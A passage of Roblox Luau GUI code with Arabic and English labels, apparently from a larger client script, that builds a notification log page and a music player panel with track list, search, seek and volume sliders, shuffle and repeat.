            sc.Scale = 0.94
            sc.Parent = card
            card.BackgroundTransparency = 1
            stroke.Transparency = 1
            msg.TextTransparency = 1
            kindLbl.TextTransparency = 1
            timeLbl.TextTransparency = 1
            glyph.TextTransparency = 1
            tile.BackgroundTransparency = 1
            tileStroke.Transparency = 1
            task.delay(math.min(delayIdx or 0, 10) * 0.035, function()
                if not card.Parent then return end
                local ti = TweenInfo.new(0.28, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
                TweenService:Create(sc, TweenInfo.new(0.32, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = 1 }):Play()
                TweenService:Create(card, ti, { BackgroundTransparency = 0 }):Play()
                TweenService:Create(stroke, ti, { Transparency = 0.3 }):Play()
                TweenService:Create(msg, ti, { TextTransparency = 0 }):Play()
                TweenService:Create(kindLbl, ti, { TextTransparency = 0 }):Play()
                TweenService:Create(timeLbl, ti, { TextTransparency = 0 }):Play()
                TweenService:Create(glyph, ti, { TextTransparency = 0 }):Play()
                TweenService:Create(tile, ti, { BackgroundTransparency = 0.86 }):Play()
                TweenService:Create(tileStroke, ti, { Transparency = 0.55 }):Play()
            end)
        end
        return card, stroke
    end

    local function updateSubtitle(log)
        local n = #log
        if n == 0 then
            subtitle.Text = isEn() and "All caught up" or "ما فيه شي جديد"
            return
        end
        local last = log[n]
        if isEn() then
            subtitle.Text = n .. " notifications  ·  last " .. ago(last.ts)
        else
            subtitle.Text = n .. " اشعار  ·  آخرها " .. ago(last.ts)
        end
    end

    -- mode: "all" = animate every card, "first" = animate only the newest, nil = no animation
    render = function(mode)
        for _, c in ipairs(scroll:GetChildren()) do
            if c:IsA("GuiObject") then c:Destroy() end
        end
        local log = _T18NotifLog or {}
        local counts = { all = #log, ok = 0, warn = 0, err = 0, info = 0 }
        for _, e in ipairs(log) do
            e.k = e.k or classify(e.m)
            counts[e.k] = (counts[e.k] or 0) + 1
        end
        paintChips(counts)
        updateSubtitle(log)
        TweenService:Create(liveDot, TweenInfo.new(0.2), { BackgroundColor3 = (#log > 0) and NL_GREEN or Color3.fromRGB(90, 90, 90) }):Play()

        local shown = 0
        for i = #log, 1, -1 do
            local e = log[i]
            if activeFilter == "all" or e.k == activeFilter then
                local anim = (mode == "all") or (mode == "first" and shown == 0)
                makeCard(e, shown, anim, shown)
                shown = shown + 1
            end
        end

        empty.Visible = shown == 0
        if shown == 0 then
            if #log == 0 then
                emptyTitle.Text = T18T("لا توجد اشعارات بعد")
                emptySub.Text = isEn() and "Every alert you get will show up here." or "أي اشعار يطلع لك بينحفظ هنا"
            else
                emptyTitle.Text = isEn() and "Nothing in this filter" or "ما فيه اشعارات من هالنوع"
                emptySub.Text = isEn() and "Try another category." or "جرب تصنيف ثاني"
            end
        end
        clearBtn.Visible = #log > 0
    end

    -- keep relative times fresh while the page is open
    task.spawn(function()
        while page.Parent do
            task.wait(5)
            if page.Visible then
                for lbl, e in pairs(timeRefs) do
                    if lbl.Parent then lbl.Text = metaText(e) end
                end
                updateSubtitle(_T18NotifLog or {})
            end
        end
    end)

    _T18OnNotif = function()
        if page.Visible then
            render("first")
            scroll.CanvasPosition = Vector2.new(0, 0)
            TweenService:Create(bell, TweenInfo.new(0.12, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 1, true), { Rotation = 18 }):Play()
        end
    end

    local frozen = {}
    local function setBehindLocked(lock)
        if lock then
            for _, c in ipairs(OthersPage:GetChildren()) do
                if c ~= page and c:IsA("GuiObject") and not frozen[c] then
                    local st = {}
                    pcall(function() st.i = c.Interactable; c.Interactable = false end)
                    if c:IsA("ScrollingFrame") then st.s = c.ScrollingEnabled; c.ScrollingEnabled = false end
                    frozen[c] = st
                end
            end
        else
            for c, st in pairs(frozen) do
                if c.Parent then
                    if st.i ~= nil then pcall(function() c.Interactable = st.i end) end
                    if st.s ~= nil then c.ScrollingEnabled = st.s end
                end
            end
            frozen = {}
        end
    end

    local function openPage()
        activeFilter = "all"
        render("all")
        scroll.CanvasPosition = Vector2.new(0, 0)
        pageScale.Scale = 0.96
        page.Visible = true
        setBehindLocked(true)
        TweenService:Create(pageScale, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = 1 }):Play()
    end
    local function closePage()
        setBehindLocked(false)
        local tw = TweenService:Create(pageScale, TweenInfo.new(0.14, Enum.EasingStyle.Quad, Enum.EasingDirection.In), { Scale = 0.96 })
        tw:Play()
        tw.Completed:Connect(function()
            page.Visible = false
            pageScale.Scale = 1
        end)
    end

    logBtn.MouseButton1Click:Connect(openPage)
    closeBtn.MouseButton1Click:Connect(closePage)

    local function disarmClear()
        clearBtn:SetAttribute("Armed", nil)
        clearBtn.Text = T18T("مسح الكل")
        TweenService:Create(clearBtn, TweenInfo.new(0.12), { BackgroundColor3 = Theme.ButtonDefault, TextColor3 = Theme.Muted }):Play()
        TweenService:Create(clearStroke, TweenInfo.new(0.12), { Color = Theme.Border }):Play()
    end
    clearBtn.MouseButton1Click:Connect(function()
        if clearBtn:GetAttribute("Armed") then
            disarmClear()
            _T18NotifLog = {}
            render(nil)
            return
        end
        clearBtn:SetAttribute("Armed", true)
        clearBtn.Text = T18T("متأكد؟")
        TweenService:Create(clearBtn, TweenInfo.new(0.12), { BackgroundColor3 = Theme.ButtonDefaultAlt, TextColor3 = NL_AMBER }):Play()
        TweenService:Create(clearStroke, TweenInfo.new(0.12), { Color = NL_AMBER }):Play()
        task.delay(3, function()
            if clearBtn.Parent and clearBtn:GetAttribute("Armed") then disarmClear() end
        end)
    end)
end)()

do
    local OthersScrollFrame = Instance.new("ScrollingFrame")
    OthersScrollFrame.Name = "OthersScrollFrame"
    local fixedHeaderHeight = 112
    OthersScrollFrame.Position = UDim2.fromOffset(0, fixedHeaderHeight)
    OthersScrollFrame.Size = UDim2.new(1, 0, 1, -fixedHeaderHeight)
    OthersScrollFrame.BackgroundTransparency = 1
    OthersScrollFrame.BorderSizePixel = 0
    OthersScrollFrame.ScrollBarThickness = isTouchDevice and 3 or 4
    OthersScrollFrame.ScrollBarImageColor3 = Theme.Active
    OthersScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 526 - fixedHeaderHeight)
    OthersScrollFrame.ScrollingDirection = Enum.ScrollingDirection.Y
    OthersScrollFrame.ElasticBehavior = Enum.ElasticBehavior.Always
    OthersScrollFrame.ClipsDescendants = true
    OthersScrollFrame.Parent = OthersPage
    -- Keep the title and HD command row outside the scrolling viewport.
    for _, child in ipairs(OthersPage:GetChildren()) do
        if child ~= OthersScrollFrame and child:IsA("GuiObject") and child.Position.Y.Offset >= fixedHeaderHeight then
            child.Position = child.Position - UDim2.fromOffset(0, fixedHeaderHeight)
            child.Parent = OthersScrollFrame
        end
    end
end

;(function()
    local musicScroll = OthersPage:FindFirstChild("OthersScrollFrame")
    if not musicScroll then return end

    local musicTracks = {
        { title = "الأغنية الأولى",   id = "107273226047360" },
        { title = "الأغنية الثانية",  id = "114138252573975" },
        { title = "الأغنية الثالثة",  id = "106271890575602" },
        { title = "الأغنية الرابعة",  id = "79782048494430"  },
    }

    -- تنظيف أي نسخة سابقة
    local oldSongsButton = musicScroll:FindFirstChild("SongsButton")
    if oldSongsButton then oldSongsButton:Destroy() end
    local oldSongsOverlay = OthersPage:FindFirstChild("R7LSongsOverlay")
    if oldSongsOverlay then oldSongsOverlay:Destroy() end

    -- ── زر فتح القائمة ───────────────────────────────────────────
    local songsButton = makeButton(
        "SongsButton", T18T("🎵 أغاني"),
        UDim2.new(1, -20, 0, 38), UDim2.new(0, 10, 0, 360),
        Theme.ButtonBlue, Theme.Accent
    )
    songsButton.Parent = musicScroll

    -- ── الخلفية المعتمة ──────────────────────────────────────────
    local overlay = Instance.new("Frame")
    overlay.Name = "R7LSongsOverlay"
    overlay.Size = UDim2.fromScale(1, 1)
    overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    overlay.BackgroundTransparency = 0.35
    overlay.BorderSizePixel = 0
    overlay.Visible = false
    overlay.Active = true
    overlay.ZIndex = 80
    overlay.Parent = OthersPage

    -- ── البانل الرئيسي (ارتفاع مضغوط عشان ما ينقص من الحدود) ────
    local PANEL_H = 322
    local panel = Instance.new("Frame")
    panel.Name = "R7LSongsPanel"
    panel.AnchorPoint = Vector2.new(0.5, 0.5)
    panel.Size = UDim2.new(1, -24, 0, PANEL_H)
    panel.Position = UDim2.new(0.5, 0, 0.5, 0)
    panel.BackgroundColor3 = Theme.Panel
    panel.BorderSizePixel = 0
    panel.Active = true
    panel.ClipsDescendants = true
    panel.ZIndex = 81
    panel.Parent = overlay
    makeCorner(panel, 16)
    makeStroke(panel, Theme.Border, 1, 0.1)

    -- ── هيدر بتدرج لوني ──────────────────────────────────────────
    local HEADER_H = 58
    local header = Instance.new("Frame")
    header.Name = "SongsHeader"
    header.Size = UDim2.new(1, 0, 0, HEADER_H)
    header.Position = UDim2.new(0, 0, 0, 0)
    header.BackgroundColor3 = Theme.Header
    header.BorderSizePixel = 0
    header.ZIndex = 82
    header.Parent = panel
    makeCorner(header, 16)
    local headerFix = Instance.new("Frame")
    headerFix.Size = UDim2.new(1, 0, 0, 16)
    headerFix.Position = UDim2.new(0, 0, 1, -16)
    headerFix.BackgroundColor3 = Theme.Header
    headerFix.BorderSizePixel = 0
    headerFix.ZIndex = 82
    headerFix.Parent = header
    local hg = Instance.new("UIGradient")
    hg.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(26, 26, 26)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 6, 6)),
    })
    hg.Rotation = 90
    hg.Parent = header

    -- أيقونة دائرية (تدور وقت التشغيل) — رمز 🎵 مضمون الظهور (emoji قياسي)
    local discIcon = Instance.new("Frame")
    discIcon.Name = "DiscIcon"
    discIcon.Size = UDim2.new(0, 38, 0, 38)
    discIcon.Position = UDim2.new(0, 10, 0, 10)
    discIcon.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
    discIcon.BorderSizePixel = 0
    discIcon.ZIndex = 83
    discIcon.Parent = header
    makeCorner(discIcon, 19)
    makeStroke(discIcon, Theme.Border, 1.5, 0.05)
    local discLabel = Instance.new("TextLabel")
    discLabel.Size = UDim2.fromScale(1, 1)
    discLabel.BackgroundTransparency = 1
    discLabel.Text = "🎵"
    discLabel.TextColor3 = Theme.Text
    discLabel.Font = Enum.Font.GothamBold
    discLabel.TextSize = 16
    discLabel.ZIndex = 84
    discLabel.Parent = discIcon

    local titleLabel = Instance.new("TextLabel")
    titleLabel.Name = "SongsTitle"
    titleLabel.Size = UDim2.new(1, -130, 0, 20)
    titleLabel.Position = UDim2.new(0, 58, 0, 8)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = T18T("قائمة الأغاني")
    titleLabel.TextColor3 = Theme.Text
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.TextSize = 15
    titleLabel.ZIndex = 83
    titleLabel.Parent = header

    local nowPlaying = Instance.new("TextLabel")
    nowPlaying.Name = "SongsNowPlaying"
    nowPlaying.Size = UDim2.new(1, -130, 0, 16)
    nowPlaying.Position = UDim2.new(0, 58, 0, 28)
    nowPlaying.BackgroundTransparency = 1
    nowPlaying.Text = T18T("لم يتم اختيار أغنية")
    nowPlaying.TextColor3 = Theme.Muted
    nowPlaying.TextXAlignment = Enum.TextXAlignment.Left
    nowPlaying.Font = Enum.Font.Gotham
    nowPlaying.TextSize = 11
    nowPlaying.TextTruncate = Enum.TextTruncate.AtEnd
    nowPlaying.ZIndex = 83
    nowPlaying.Parent = header

    local closeButton = Instance.new("TextButton")
    closeButton.Name = "SongsCloseButton"
    closeButton.Size = UDim2.new(0, 28, 0, 28)
    closeButton.Position = UDim2.new(1, -36, 0, 10)
    closeButton.BackgroundColor3 = Theme.PanelSoft
    closeButton.BorderSizePixel = 0
    closeButton.AutoButtonColor = false
    closeButton.Text = "×"
    closeButton.TextColor3 = Theme.Text
    closeButton.Font = Enum.Font.GothamBold
    closeButton.TextSize = 18
    closeButton.ZIndex = 84
    closeButton.Parent = header
    makeCorner(closeButton, 9)
    makeStroke(closeButton, Theme.Border, 1, 0.1)

    -- ── شريط التقدّم (Progress bar) ──────────────────────────────
    local progressRow = Instance.new("Frame")
    progressRow.Name = "ProgressRow"
    progressRow.Size = UDim2.new(1, -28, 0, 26)
    progressRow.Position = UDim2.new(0, 14, 0, HEADER_H + 6)
    progressRow.BackgroundTransparency = 1
    progressRow.ZIndex = 82
    progressRow.Parent = panel

    local progressTrack = Instance.new("TextButton")
    progressTrack.Name = "ProgressTrack"
    progressTrack.Size = UDim2.new(1, 0, 0, 5)
    progressTrack.Position = UDim2.new(0, 0, 0, 4)
    progressTrack.BackgroundColor3 = Theme.PanelSoft
    progressTrack.BorderSizePixel = 0
    progressTrack.AutoButtonColor = false
    progressTrack.Text = ""
    progressTrack.ZIndex = 82
    progressTrack.Parent = progressRow
    makeCorner(progressTrack, 3)

    local progressFill = Instance.new("Frame")
    progressFill.Name = "ProgressFill"
    progressFill.Size = UDim2.new(0, 0, 1, 0)
    progressFill.BackgroundColor3 = Theme.Text
    progressFill.BorderSizePixel = 0
    progressFill.ZIndex = 83
    progressFill.Parent = progressTrack
    makeCorner(progressFill, 3)

    local progressKnob = Instance.new("Frame")
    progressKnob.Name = "ProgressKnob"
    progressKnob.Size = UDim2.new(0, 10, 0, 10)
    progressKnob.AnchorPoint = Vector2.new(0.5, 0.5)
    progressKnob.Position = UDim2.new(1, 0, 0.5, 0)
    progressKnob.BackgroundColor3 = Theme.Text
    progressKnob.BorderSizePixel = 0
    progressKnob.ZIndex = 84
    progressKnob.Parent = progressFill
    makeCorner(progressKnob, 5)

    local timeStart = Instance.new("TextLabel")
    timeStart.Size = UDim2.new(0, 60, 0, 14)
    timeStart.Position = UDim2.new(0, 0, 0, 12)
    timeStart.BackgroundTransparency = 1
    timeStart.Text = "0:00"
    timeStart.TextColor3 = Theme.Muted
    timeStart.TextXAlignment = Enum.TextXAlignment.Left
    timeStart.Font = Enum.Font.Code
    timeStart.TextSize = 10
    timeStart.ZIndex = 82
    timeStart.Parent = progressRow

    local timeEnd = Instance.new("TextLabel")
    timeEnd.Size = UDim2.new(0, 60, 0, 14)
    timeEnd.Position = UDim2.new(1, -60, 0, 12)
    timeEnd.BackgroundTransparency = 1
    timeEnd.Text = "0:00"
    timeEnd.TextColor3 = Theme.Muted
    timeEnd.TextXAlignment = Enum.TextXAlignment.Right
    timeEnd.Font = Enum.Font.Code
    timeEnd.TextSize = 10
    timeEnd.ZIndex = 82
    timeEnd.Parent = progressRow

    -- ── صندوق البحث داخل القائمة ─────────────────────────────────
    local searchY = HEADER_H + 36
    local searchBox = Instance.new("TextBox")
    searchBox.Name = "SongsSearch"
    searchBox.Size = UDim2.new(1, -28, 0, 26)
    searchBox.Position = UDim2.new(0, 14, 0, searchY)
    searchBox.BackgroundColor3 = Theme.Input
    searchBox.BorderSizePixel = 0
    searchBox.PlaceholderText = T18T("ابحث عن أغنية...")
    searchBox.Text = ""
    searchBox.TextColor3 = Theme.Text
    searchBox.PlaceholderColor3 = Theme.Muted
    searchBox.Font = Enum.Font.Gotham
    searchBox.TextSize = 12
    searchBox.ClearTextOnFocus = false
    searchBox.ZIndex = 82
    searchBox.Parent = panel
    makeCorner(searchBox, 7)
    makeStroke(searchBox, Theme.Border, 1, 0.2)

    -- ── قائمة الأغاني القابلة للتمرير ────────────────────────────
    local listY = searchY + 32
    local LIST_H = 96
    local listFrame = Instance.new("ScrollingFrame")
    listFrame.Name = "SongsList"
    listFrame.Size = UDim2.new(1, -28, 0, LIST_H)
    listFrame.Position = UDim2.new(0, 14, 0, listY)
    listFrame.BackgroundTransparency = 1
    listFrame.BorderSizePixel = 0
    listFrame.ScrollBarThickness = 3
    listFrame.ScrollBarImageColor3 = Theme.Border
    listFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
    listFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
    listFrame.ZIndex = 82
    listFrame.Parent = panel
    local listLayout = Instance.new("UIListLayout")
    listLayout.SortOrder = Enum.SortOrder.LayoutOrder
    listLayout.Padding = UDim.new(0, 4)
    listLayout.Parent = listFrame

    -- ── أزرار التحكم (سابق / تشغيل / تالي) ──────────────────────
    local controlsY = listY + LIST_H + 10
    local controlsRow = Instance.new("Frame")
    controlsRow.Name = "ControlsRow"
    controlsRow.Size = UDim2.new(1, -28, 0, 46)
    controlsRow.Position = UDim2.new(0, 14, 0, controlsY)
    controlsRow.BackgroundTransparency = 1
    controlsRow.ZIndex = 82
    controlsRow.Parent = panel

    local function makeIconButton(name, text, size, position, parent, textSize, round)
        local button = Instance.new("TextButton")
        button.Name = name
        button.Size = size
        button.Position = position
        button.BackgroundColor3 = Theme.ButtonDefault
        button.BackgroundTransparency = 0.05
        button.BorderSizePixel = 0
        button.AutoButtonColor = false
        button.Text = text
        button.TextColor3 = Theme.Text
        button.Font = Enum.Font.GothamBold
        button.TextSize = textSize or 13
        button.TextWrapped = true
        button.ZIndex = 83
        button.Parent = parent
        makeCorner(button, round or 10)
        makeStroke(button, Theme.Border, 1, 0.15)
        return button
    end

    -- أزرار عشوائي/تكرار: نص عربي قصير مضمون الظهور (بدل رموز Unicode نادرة)
    local shuffleOn = false
    local shuffleButton = makeIconButton("SongsShuffle", T18T("عشوائي"), UDim2.new(0, 46, 0, 36), UDim2.new(0, 0, 0, 5), controlsRow, 10, 9)

    local previousButton = makeIconButton("SongsPrevious", "<<", UDim2.new(0, 42, 0, 42), UDim2.new(0.5, -90, 0, 2), controlsRow, 15, 11)
    local playPauseButton = makeIconButton("SongsPlayPause", T18T("تشغيل"), UDim2.new(0, 70, 0, 46), UDim2.new(0.5, -35, 0, -2), controlsRow, 12, 23)
    playPauseButton.BackgroundColor3 = Theme.Text
    playPauseButton.TextColor3 = Color3.fromRGB(10, 10, 10)
    local nextButton = makeIconButton("SongsNext", ">>", UDim2.new(0, 42, 0, 42), UDim2.new(0.5, 48, 0, 2), controlsRow, 15, 11)

    local repeatOn = false
    local repeatButton = makeIconButton("SongsRepeat", T18T("تكرار"), UDim2.new(0, 46, 0, 36), UDim2.new(1, -46, 0, 5), controlsRow, 10, 9)

    -- ── شريط الصوت ───────────────────────────────────────────────
    local volumeY = controlsY + 50
    local volumeRow = Instance.new("Frame")
    volumeRow.Name = "VolumeRow"
    volumeRow.Size = UDim2.new(1, -28, 0, 22)
    volumeRow.Position = UDim2.new(0, 14, 0, volumeY)
    volumeRow.BackgroundTransparency = 1
    volumeRow.ZIndex = 82
    volumeRow.Parent = panel

    local volLabel = Instance.new("TextLabel")
    volLabel.Size = UDim2.new(0, 36, 0, 18)
    volLabel.Position = UDim2.new(0, 0, 0, 2)
    volLabel.BackgroundTransparency = 1
    volLabel.Text = T18T("صوت")
    volLabel.TextColor3 = Theme.Muted
    volLabel.TextXAlignment = Enum.TextXAlignment.Left
    volLabel.Font = Enum.Font.Gotham
    volLabel.TextSize = 11
    volLabel.ZIndex = 82
    volLabel.Parent = volumeRow

    local volTrack = Instance.new("TextButton")
    volTrack.Name = "VolTrack"
    volTrack.Size = UDim2.new(1, -96, 0, 6)
    volTrack.Position = UDim2.new(0, 38, 0, 8)
    volTrack.BackgroundColor3 = Theme.PanelSoft
    volTrack.BorderSizePixel = 0
    volTrack.AutoButtonColor = false
    volTrack.Text = ""
    volTrack.ZIndex = 82
    volTrack.Parent = volumeRow
    makeCorner(volTrack, 3)

    local volFill = Instance.new("Frame")
    volFill.Name = "VolFill"
    volFill.Size = UDim2.new(0.5, 0, 1, 0)
    volFill.BackgroundColor3 = Theme.Text
    volFill.BorderSizePixel = 0
    volFill.ZIndex = 83
    volFill.Parent = volTrack
    makeCorner(volFill, 3)
    local volKnob = Instance.new("Frame")
    volKnob.Size = UDim2.new(0, 10, 0, 10)
    volKnob.AnchorPoint = Vector2.new(0.5, 0.5)
    volKnob.Position = UDim2.new(1, 0, 0.5, 0)
    volKnob.BackgroundColor3 = Theme.Text
    volKnob.BorderSizePixel = 0
    volKnob.ZIndex = 84
    volKnob.Parent = volFill
    makeCorner(volKnob, 5)

    local volumeLabel = Instance.new("TextLabel")
    volumeLabel.Name = "SongsVolumeLabel"
    volumeLabel.Size = UDim2.new(0, 50, 0, 18)
    volumeLabel.Position = UDim2.new(1, -50, 0, 2)
    volumeLabel.BackgroundTransparency = 1
    volumeLabel.TextColor3 = Theme.Muted
    volumeLabel.TextXAlignment = Enum.TextXAlignment.Right
    volumeLabel.Font = Enum.Font.Code
    volumeLabel.TextSize = 11
    volumeLabel.ZIndex = 82
    volumeLabel.Parent = volumeRow

    -- ══════════════════════════════════════════════════════════
    --  المنطق
    -- ══════════════════════════════════════════════════════════
    local soundService = game:GetService("SoundService")
    local oldMusicPlayer = soundService:FindFirstChild("R7LMusicPlayer")
    if oldMusicPlayer then oldMusicPlayer:Destroy() end
    local songSound = Instance.new("Sound")
    songSound.Name = "R7LMusicPlayer"
    songSound.Volume = 0.5
    songSound.Looped = false
    songSound.Parent = soundService

    local selectedTrack = 0
    local paused = false
    local songRows = {}
    local draggingProgress = false
    local draggingVolume = false

    local function fmtTime(sec)
        sec = math.max(0, math.floor(sec or 0))
        local m = math.floor(sec / 60)
        local s = sec % 60
        return string.format("%d:%02d", m, s)
    end

    local function setPlayPauseText(playing)
        playPauseButton.Text = playing and T18T("إيقاف") or T18T("تشغيل")
    end

    local function refreshVolumeText()
        local pct = math.floor(songSound.Volume * 100 + 0.5)
        volumeLabel.Text = tostring(pct) .. "%"
        volFill.Size = UDim2.new(songSound.Volume, 0, 1, 0)
    end

    -- دوران أيقونة القرص أثناء التشغيل
    local discSpinning = false
    task.spawn(function()
        while true do
            if discSpinning then
                discIcon.Rotation = (discIcon.Rotation + 2) % 360
            end
            task.wait(0.03)
        end
    end)

    local function highlightRow(index)
        for i, row in ipairs(songRows) do
            local isSel = (i == index)
            row.BackgroundColor3 = isSel and Theme.Active or Theme.PanelSoft
            local badge = row:FindFirstChild("TrackBadge")
            if badge then
                badge.BackgroundColor3 = isSel and Theme.Text or Theme.ButtonDefault
                badge.TextColor3 = isSel and Color3.fromRGB(10,10,10) or Theme.Muted
            end
        end
    end

    local playTrack -- forward declare

    local function pickNextIndex(current)
        if shuffleOn and #musicTracks > 1 then
            local nxt
            repeat
                nxt = math.random(1, #musicTracks)
            until nxt ~= current
            return nxt
        end
        return (current % #musicTracks) + 1
    end

    playTrack = function(index)
        selectedTrack = ((index - 1) % #musicTracks) + 1
        paused = false
        local track = musicTracks[selectedTrack]
        nowPlaying.Text = T18T("يعمل الآن: ") .. T18T(track.title)
        highlightRow(selectedTrack)
        setPlayPauseText(true)
        discSpinning = true
        local ok = pcall(function()
            songSound:Stop()
            songSound.SoundId = "rbxassetid://" .. track.id
            songSound:Play()
        end)
        if not ok then
            nowPlaying.Text = T18T("تعذر تشغيل المقطع")
            setPlayPauseText(false)
            discSpinning = false
        end
    end

    -- بناء صفوف الأغاني
    local function buildRows(filter)
        for _, row in ipairs(songRows) do
            if row then row:Destroy() end
        end
        songRows = {}
        filter = (filter or ""):lower()

        for i, track in ipairs(musicTracks) do
            if filter == "" or tostring(track.title):lower():find(filter, 1, true) then
                local row = Instance.new("TextButton")
                row.Name = "SongTrack" .. tostring(i)
                row.Size = UDim2.new(1, 0, 0, 34)
                row.BackgroundColor3 = (i == selectedTrack) and Theme.Active or Theme.PanelSoft
                row.BackgroundTransparency = 0.05
                row.BorderSizePixel = 0
                row.AutoButtonColor = false
                row.Text = ""
                row.LayoutOrder = i
                row.ZIndex = 83
                row.Parent = listFrame
                makeCorner(row, 8)
                makeStroke(row, Theme.Border, 1, 0.2)

                local badge = Instance.new("TextLabel")
                badge.Name = "TrackBadge"
                badge.Size = UDim2.new(0, 24, 0, 24)
                badge.Position = UDim2.new(0, 5, 0.5, -12)
                badge.BackgroundColor3 = (i == selectedTrack) and Theme.Text or Theme.ButtonDefault
                badge.BorderSizePixel = 0
                badge.Text = tostring(i)
                badge.TextColor3 = (i == selectedTrack) and Color3.fromRGB(10,10,10) or Theme.Muted
                badge.Font = Enum.Font.GothamBold
                badge.TextSize = 12
                badge.ZIndex = 84
                badge.Parent = row
                makeCorner(badge, 6)

                local nameLbl = Instance.new("TextLabel")
                nameLbl.Size = UDim2.new(1, -40, 0, 34)
                nameLbl.Position = UDim2.new(0, 36, 0, 0)
                nameLbl.BackgroundTransparency = 1
                nameLbl.Text = T18T(track.title)
                nameLbl.TextColor3 = Theme.Text
                nameLbl.TextXAlignment = Enum.TextXAlignment.Left
                nameLbl.Font = Enum.Font.GothamBold
                nameLbl.TextSize = 12
                nameLbl.TextTruncate = Enum.TextTruncate.AtEnd
                nameLbl.ZIndex = 84
                nameLbl.Parent = row

                songRows[i] = row
                row.MouseButton1Click:Connect(function() playTrack(i) end)
            else
                songRows[i] = nil
            end
        end
    end
    buildRows("")

    searchBox:GetPropertyChangedSignal("Text"):Connect(function()
        buildRows(searchBox.Text)
    end)

    -- ── تحديث شريط التقدم كل فريم ────────────────────────────────
    game:GetService("RunService").RenderStepped:Connect(function()
        if not overlay.Visible then return end
        local len = songSound.TimeLength
        local pos = songSound.TimePosition
        if len and len > 0 and not draggingProgress then
            local ratio = math.clamp(pos / len, 0, 1)
            progressFill.Size = UDim2.new(ratio, 0, 1, 0)
            timeStart.Text = fmtTime(pos)
            timeEnd.Text = fmtTime(len)
        end
    end)

    -- سحب شريط التقدم (Seek)
    local function seekToX(inputX)
        local abs = progressTrack.AbsolutePosition.X
        local w = progressTrack.AbsoluteSize.X
        local ratio = math.clamp((inputX - abs) / math.max(w, 1), 0, 1)
        progressFill.Size = UDim2.new(ratio, 0, 1, 0)
        local len = songSound.TimeLength
        if len and len > 0 then
            songSound.TimePosition = ratio * len
            timeStart.Text = fmtTime(songSound.TimePosition)
        end
    end
    progressTrack.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            draggingProgress = true
            seekToX(input.Position.X)
        end
    end)
    game:GetService("UserInputService").InputChanged:Connect(function(input)
        if draggingProgress and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            seekToX(input.Position.X)
        end
    end)
    game:GetService("UserInputService").InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            draggingProgress = false
        end
    end)

    -- سحب شريط الصوت
    local function setVolumeFromX(inputX)
        local abs = volTrack.AbsolutePosition.X
        local w = volTrack.AbsoluteSize.X
        local ratio = math.clamp((inputX - abs) / math.max(w, 1), 0, 1)
        songSound.Volume = ratio
        refreshVolumeText()
    end
    volTrack.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            draggingVolume = true
            setVolumeFromX(input.Position.X)
        end
    end)
    game:GetService("UserInputService").InputChanged:Connect(function(input)
        if draggingVolume and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            setVolumeFromX(input.Position.X)
        end
    end)
    game:GetService("UserInputService").InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            draggingVolume = false
        end
    end)
    refreshVolumeText()

    -- ── أزرار التحكم ─────────────────────────────────────────────
    previousButton.MouseButton1Click:Connect(function()
        local cur = (selectedTrack == 0 and 1 or selectedTrack)
        playTrack(((cur - 2) % #musicTracks) + 1)
    end)
    nextButton.MouseButton1Click:Connect(function()
        local cur = (selectedTrack == 0 and 1 or selectedTrack)
        playTrack(pickNextIndex(cur))
    end)
    playPauseButton.MouseButton1Click:Connect(function()
        if songSound.IsPlaying then
            songSound:Pause()
            paused = true
            discSpinning = false
            setPlayPauseText(false)
        elseif selectedTrack == 0 then
            if shuffleOn and #musicTracks > 1 then
                playTrack(math.random(1, #musicTracks))
            else
                playTrack(1)
            end
        elseif paused then
            pcall(function() songSound:Resume() end)
            paused = false
            discSpinning = true
            setPlayPauseText(true)
        else
            playTrack(selectedTrack)
        end
    end)

    shuffleButton.MouseButton1Click:Connect(function()
        shuffleOn = not shuffleOn
        shuffleButton.BackgroundColor3 = shuffleOn and Theme.Text or Theme.ButtonDefault
        shuffleButton.TextColor3 = shuffleOn and Color3.fromRGB(10,10,10) or Theme.Text
    end)
    repeatButton.MouseButton1Click:Connect(function()
        repeatOn = not repeatOn
        repeatButton.BackgroundColor3 = repeatOn and Theme.Text or Theme.ButtonDefault
        repeatButton.TextColor3 = repeatOn and Color3.fromRGB(10,10,10) or Theme.Text
    end)

    closeButton.MouseButton1Click:Connect(function() overlay.Visible = false end)
    songsButton.MouseButton1Click:Connect(function() overlay.Visible = true end)

    songSound.Ended:Connect(function()
        if selectedTrack == 0 then
            discSpinning = false
            return
        end
        if repeatOn then
            -- ارجع للثانية 0 وشغّل من جديد (لازم Stop قبل Play لإجبار إعادة البدء)
            songSound:Stop()
            songSound.TimePosition = 0
            songSound:Play()
        else
            playTrack(pickNextIndex(selectedTrack))
        end
    end)
end)()


do
    local PlayerScrollFrame = Instance.new("ScrollingFrame")
    PlayerScrollFrame.Size = UDim2.new(1, 0, 1, 0)
    PlayerScrollFrame.BackgroundTransparency = 1
    PlayerScrollFrame.BorderSizePixel = 0
    PlayerScrollFrame.ScrollBarThickness = isTouchDevice and 3 or 4
    PlayerScrollFrame.ScrollBarImageColor3 = Theme.Active
    PlayerScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 352)
